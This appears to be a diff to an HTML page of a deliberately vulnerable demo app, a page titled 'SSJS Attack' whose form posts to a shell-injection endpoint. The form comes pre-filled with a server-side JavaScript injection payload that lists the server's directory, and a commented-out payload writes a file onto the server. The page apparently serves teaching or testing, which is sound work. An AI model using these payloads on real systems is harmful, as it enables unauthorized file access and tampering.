@@ -3,13 +3,21 @@
   <head>
     <title>SSJS Attack</title>
     <link rel='stylesheet' href='/stylesheets/style.css' />
-    <script>
-    </script>
+    <style>
+      #year {
+        font-size:20px;
+        width: 500px;
+      }
+    </style>
   </head>
   <body>
-    <h1>SSJS </h1>
+    <h1>SSJS Attack</h1>
+    <p>Lets try a different payload</p>
     <form id="myForm" method="POST" action="/shellinjection/ssjs-api">
-    <input length="300" value="res.end(require('fs').readdirSync('.').toString())" name="year" id="year" />
+    <input style="width: 500px" value="res.end(require('fs').readdirSync('.').toString())" name="year" id="year" />
+    <!--<input style="width: 500px" value="require('fs').writeFileSync('badcode.js','MUHAHAHAHAHA','utf8')" name="year" id="year" />-->
+
+    
     <button type="submit">Submit</button>
     </form>
 
